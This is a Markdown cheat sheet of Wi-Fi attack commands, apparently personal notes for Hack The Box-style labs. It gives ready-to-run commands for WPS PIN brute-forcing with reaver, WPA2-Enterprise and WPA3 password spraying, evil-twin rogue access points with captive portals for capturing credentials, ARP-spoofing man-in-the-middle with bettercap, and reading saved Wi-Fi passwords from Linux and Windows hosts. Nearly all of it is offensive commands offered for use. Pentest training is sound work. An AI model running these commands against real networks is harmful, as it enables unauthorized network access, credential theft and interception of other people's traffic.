#wifi #kismet #reaver #eaphammer #bettercap

# Wi-Fi Tools & Techniques

Recon, WPS, online brute-force, evil twin, MITM, saved-cred retrieval. Related: [basics](basics.md) · [evil-twin](evil-twin.md) · [wps](wps.md) · [wpa3](wpa3.md)

## Recon
```bash
sudo airodump-ng --wps --manufacturer wlan0mon
```
Scan showing manufacturer + WPS details.

```bash
sudo kismet -c wlan0mon
```
Launch Kismet WebUI capturing on the interface.

```bash
sudo kismetdb_to_kml --in Kismet-*.kismet --out geo.kml
```
Export a Kismet log to KML (also `kismetdb_dump_devices --ekjson`).

```bash
python3 wifi_db.py -d database.sqlite scan-folder
```
Parse airodump scans into a SQLite DB.

## WPS (reaver)
```bash
reaver -i mon0 -b AE:EB:B0:11:A0:1E -c 1
```
Brute-force the WPS PIN.

```bash
reaver -b 5A:1A:59:B7:E7:97 -c 1 -i mon0 -p " "
```
WPS null-PIN attack (`-p 1234` for a partial PIN).

## Online Brute-Force
```bash
python2 air-hammer.py -i wlan1 -e HTB-Corp -P 123456789 -u usernames.txt
```
WPA2-Enterprise password spray (`-p wordlist -u user.txt` for single-user).

```bash
python3 wacker.py --interface wlan1 --wordlist rockyou.txt --ssid <SSID> --freq 2412 --bssid <MAC>
```
WPA3-SAE online brute-force. See [wpa3](wpa3.md).

## Evil Twin / Captive Portal
```bash
./eaphammer -i wlan0 --channel 1 --auth wpa-psk --essid HTB-WPA --captive-portal --lhost 192.168.1.1
```
Rogue AP with a captive portal (`--auth wpa-eap --creds` for enterprise cred capture). See [evil-twin](evil-twin.md).

```bash
./eaphammer --cert-wizard
```
Generate certificates for the rogue AP.

```bash
sudo -E /opt/airgeddon/airgeddon.sh
```
All-in-one WiFi attack framework (also `sudo wifipumpkin3`).

## MITM
```bash
sudo sysctl -w net.ipv4.ip_forward=1
```
Enable IP forwarding.

```bash
sudo bettercap -iface wlan0
```
Launch Bettercap for ARP spoofing/MITM. See [traffic-analysis](../Network/traffic-analysis.md).

## Retrieve Saved Credentials
```bash
cat /etc/NetworkManager/system-connections/<SSID>
```
Read a stored Wi-Fi PSK (Linux).

```cmd
netsh wlan show profile HTB-Internal key=clear
```
Reveal a stored Wi-Fi password (Windows).
